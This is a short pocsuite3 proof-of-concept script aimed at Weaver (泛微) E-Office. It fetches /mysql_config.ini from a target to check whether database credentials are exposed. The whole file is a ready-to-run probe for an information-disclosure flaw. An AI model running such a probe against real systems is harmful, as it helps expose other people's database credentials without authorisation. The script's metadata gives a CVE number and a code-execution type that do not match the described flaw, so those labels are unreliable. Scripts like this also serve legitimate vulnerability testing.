from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
class DemoPOC(POCBase):
    vulID = 'CVE-2020-17519'  # ssvid
    version = '1.0'
    name = '泛微 E-Office'
    appName = '泛微'
    appVersion = '3.0.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''泛微 E-Office mysql_config.ini文件可直接访问，泄漏数据库账号密码等信息'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/mysql_config.ini"
            r = requests.get(url=target,timeout=10,verify=False)
            if r.status_code == 200 and "dataname" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['payload'] = "/mysql_config.ini"
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)